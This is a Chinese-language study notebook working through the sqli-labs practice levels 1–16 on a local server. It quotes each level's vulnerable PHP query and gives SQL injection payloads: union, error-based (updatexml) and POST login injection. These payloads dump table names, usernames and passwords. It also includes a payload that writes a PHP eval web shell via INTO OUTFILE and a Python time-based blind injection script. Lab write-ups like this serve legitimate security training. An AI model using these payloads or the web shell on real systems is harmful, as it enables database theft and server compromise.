
## LESS-1 #union注入
```PHP
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```
在有回显的情况下是可以通过报错来判断闭合的符号的
需要引号闭合
注列数
`http://127.0.0.1:8888/sqli-labs-master/Less-1/?id=1' order by 3 --+`
确定有回显的字段,这里确定3有回显
`http://127.0.0.1:8888/sqli-labs-master/Less-1/?id=1' union select 1,2,3--+`
爆库名,库名为security
`http://127.0.0.1:8888/sqli-labs-master/Less-1/?id=-1' union select 1,2,database()--+`
爆表名
`http://127.0.0.1:8888/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+`
爆列名
`http://127.0.0.1:8888/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+`
爆出字段
`http://127.0.0.1:8888/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+`

## LESS-2 #union注入 
```php
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```
和less-1不同点在于不需要进行引号闭合
注列数
`http://127.0.0.1:8888/sqli-labs-master/Less-2/?id=1 order by 3 --+`
确定有回显的字段,这里确定3有回显
`http://127.0.0.1:8888/sqli-labs-master/Less-2/?id=1 union select 1,2,3--+`
爆库名,库名为security
`http://127.0.0.1:8888/sqli-labs-master/Less-2/?id=-1 union select 1,2,database()--+`
爆表名
`http://127.0.0.1:8888/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+`
爆列名
`http://127.0.0.1:8888/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+`
爆出字段
`http://127.0.0.1:8888/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users--+`

## LESS-3 #union注入 
```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```

`http://127.0.0.1:8888/sqli-labs-master/Less-3/?id=1') order by 3 --+`

`http://127.0.0.1:8888/sqli-labs-master/Less-3/?id=1') union select 1,2,3 --+`

`http://127.0.0.1:8888/sqli-labs-master/Less-3/?id=-1') union select 1,2,database() --+`

`http://127.0.0.1:8888/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+`

`http://127.0.0.1:8888/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+`

`http://127.0.0.1:8888/sqli-labs-master/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users --+`

## LESS-4 #union注入 
从这里开始不再挨个记录payload仅记录变化的和闭合方式
") 闭合
```php
$id = '"' . $id . '"';  
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```

`http://127.0.0.1:8888/sqli-labs-master/Less-4?id=1") order by 3--+`

## LESS-5 #报错注入 
这关无结果回显,有报错,可以使用报错注入
updatexml是需要分段注入的
```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```
' 闭合
`http://127.0.0.1:8888/sqli-labs-master/Less-5?id=1'`
爆库名
`http://127.0.0.1:8888/sqli-labs-master/Less-5?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+`
爆表名
`http://127.0.0.1:8888/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+`
爆列名
`http://127.0.0.1:8888/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,31),0x7e),1)--+`
爆字段
`http://127.0.0.1:8888/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+`

## LESS-6 #报错注入 
```php
$id = '"'.$id.'"';  
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```
“ 闭合
同样使用updatexml()

## LESS-7 #导出文件注入 
```php
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```

这样的语句是可以写入文件的但是需要打开 ==secure-file-priv== ，在my.ini中将值设为文件夹
`SELECT * FROM users WHERE id=(('1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "C:\\wum0ster\\tools\\Web\\phpstudy\\phpstudy_pro\\WWW\\sql-lab\\sqli-labs-master\\Less-7\\shell.php";`

![[Pasted image 20230216222934.png]]

`http://127.0.0.1:8888/sqli-labs-master/Less-7?id=1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "C:\\wum0ster\\tools\\Web\\phpstudy\\phpstudy_pro\\WWW\\sql-lab\\sqli-labs-master\\Less-7\\shell.php"--+`

## LESS-8 #BOOL盲注
只会显示 You are in ...... 在其他时候会不显示，判断为bool盲注，盲注类的适合使用脚本，二分法的最快
```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);  
  
	if($row)  
	{   
	echo '<font size="5" color="#FFFF00">';      
	echo 'You are in...........';  
	echo "<br>";  
	    echo "</font>";  
	}  
	else   
	{  
	echo '<font size="5" color="#FFFF00">';  
   //echo 'You are in...........';  
   //print_r(mysql_error());   //echo "You have an error in your SQL syntax";   echo "</br></font>";     
	echo '<font color= "#0000ff" font size= 3>';     
     
	}  
```


## LESS-9 #时间盲注
```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);  
  
   if($row)  
   {   echo '<font size="5" color="#FFFF00">';      
echo 'You are in...........';  
   echo "<br>";  
       echo "</font>";  
   }  
   else   
{  
   echo '<font size="5" color="#FFFF00">';  
   echo 'You are in...........';  
   //print_r(mysql_error());  
   //echo "You have an error in your SQL syntax";   echo "</br></font>";     
echo '<font color= "#0000ff" font size= 3>';     
     
}
```

```python
# -*-coding:utf-8-*-  
# ----anthor: wum0nster---- #  
  
import requests  
import time  
  
  
def sql_bool():  
    req = ""  
    for i in range(1,1000):  
        low = 32  
        high = 128  
        # payload = "database()"  
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"        # payload = "select group_concat(column_name) from information_schema.columns where table_name='users'"        payload = "select group_concat(concat(username,'~',password)) from users"  
        while low < high:  
            mid = (low + high) // 2  
            # url = f"http://127.0.0.1:8888/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),{i},1))>{mid},sleep(1),0) --+"  
            url = f"http://127.0.0.1:8888/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+"  
  
            try:  
                res = requests.get(url=url, timeout=1)  
                high = mid  
            except Exception as e:  
                low = mid+1  
  
            print(payload)  
        req = req + chr(low)  
        print(req)  
sql_bool()
```

## LESS-10 #时间盲注 

```PHP
$id = '"'.$id.'"';  
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);  
  
   if($row)  
   {   echo '<font size="5" color="#FFFF00">';      
echo 'You are in...........';  
   echo "<br>";  
       echo "</font>";  
   }  
   else   
{  
   echo '<font size="5" color="#FFFF00">';  
   echo 'You are in...........';  
   //print_r(mysql_error());  
   //echo "You have an error in your SQL syntax";   echo "</br></font>";     
echo '<font color= "#0000ff" font size= 3>';     
     
}
```

```PYTHON
# -*-coding:utf-8-*-  
# ----anthor: wum0nster---- #  
  
import requests  
import time  
  
  
def sql_bool():  
    req = ""  
    for i in range(1, 1000):  
        low = 32  
        high = 128  
        # payload = "database()"  
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"        # payload = "select group_concat(column_name) from information_schema.columns where table_name='users'"        payload = "select group_concat(concat(username,'~',password)) from users"  
        while low < high:  
            mid = (low + high) // 2  
            url = f"http://127.0.0.1:8888/sqli-labs-master/Less-10/?id=1\" and if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+ "  
  
            try:  
                res = requests.get(url=url, timeout=1)  
                high = mid  
            except Exception as e:  
                low = mid+1  
  
            print(url)  
        req = req + chr(low)  
        print(req)  
sql_bool()
```

## LESS-11
```php
$uname=$_POST['uname'];  
$passwd=$_POST['passwd'];  
  
//logging the connection parameters to a file for analysis.  
$fp=fopen('result.txt','a');  
fwrite($fp,'User Name:'.$uname);  
fwrite($fp,'Password:'.$passwd."\n");  
fclose($fp);  
  
  
// connectivity @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```
爆字段数
![](attachment/Pasted%20image%2020230225152558.png)
data : uname=1' union select 1,database() --+&passwd=1

![](attachment/Pasted%20image%2020230225152715.png)

data: uname=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&passwd=1
![](attachment/Pasted%20image%2020230225153134.png)

data： uname=1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+&passwd=1
![](attachment/Pasted%20image%2020230225153304.png)

data: uname=1' union select 1,group_concat(concat(username,'~',password)) from users --+&passwd=1
![](attachment/Pasted%20image%2020230225153356.png)

## LESS-12 
```php
$uname=$_POST['uname'];  
$passwd=$_POST['passwd'];  
  
//logging the connection parameters to a file for analysis.  
$fp=fopen('result.txt','a');  
fwrite($fp,'User Name:'.$uname."\n");  
fwrite($fp,'Password:'.$passwd."\n");  
fclose($fp);  
  
  
// connectivity  
$uname='"'.$uname.'"';  
$passwd='"'.$passwd.'"'; @$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);
```
闭合方式变为`")`
data: uname=1") union select 1,group_concat(concat(username,password)) from users --+&passwd=1

## LESS-13 #报错注入 

```php
@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);  
  
if($row)  
{  
      //echo '<font color= "#0000ff">';    
        
echo "<br>";  
   echo '<font color= "#FFFF00" font size = 4>';  
   //echo " You Have successfully logged in " ;  
   echo '<font size="3" color="#0000ff">';      
echo "<br>";  
   //echo 'Your Login name:'. $row['username'];  
   //echo "<br>";   //echo 'Your Password:' .$row['password'];   //echo "<br>";   echo "</font>";  
   echo "<br>";  
   echo "<br>";  
   echo '<img src="../images/flag.jpg"   />';   
     
echo "</font>";  
   }  
else  {  
   echo '<font color= "#0000ff" font size="3">';  
   //echo "Try again looser";  
   print_r(mysql_error());  
   echo "</br>";  
   echo "</br>";  
   echo "</br>";  
   echo '<img src="../images/slap.jpg"   />';   
echo "</font>";  }
```
**DATA:**
- `uname=1&passwd=1') and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+`
- `uname=1&passwd=1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+`
- `uname=1&passwd=1') and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),35,31),0x7e),1) --+`
- `uname=1&passwd=1') and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'~',password)) from users),1,31),0x7e),1) --+`


## LESS-14 #报错注入 

闭合方式为 `"`
```php
$uname='"'.$uname.'"';  
$passwd='"'.$passwd.'"'; @$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);  
  
if($row)  
{  
      //echo '<font color= "#0000ff">';    
        
echo "<br>";  
   echo '<font color= "#FFFF00" font size = 4>';  
   //echo " You Have successfully logged in " ;  
   echo '<font size="3" color="#0000ff">';      
echo "<br>";  
   //echo 'Your Login name:'. $row['username'];  
   //echo "<br>";   //echo 'Your Password:' .$row['password'];   //echo "<br>";   echo "</font>";  
   echo "<br>";  
   echo "<br>";  
   echo '<img src="../images/flag.jpg" />';     
     
echo "</font>";  
   }  
else  {  
   echo '<font color= "#0000ff" font size="3">';  
   //echo "Try again looser";  
   print_r(mysql_error());  
   echo "</br>";  
   echo "</br>";  
   echo "</br>";  
   echo '<img src="../images/slap.jpg"  />';    
echo "</font>";  }
```

## LESS-15 #有疑问
sql之后反应很慢，有点抽象

## LESS-16 #有疑问 
和15一样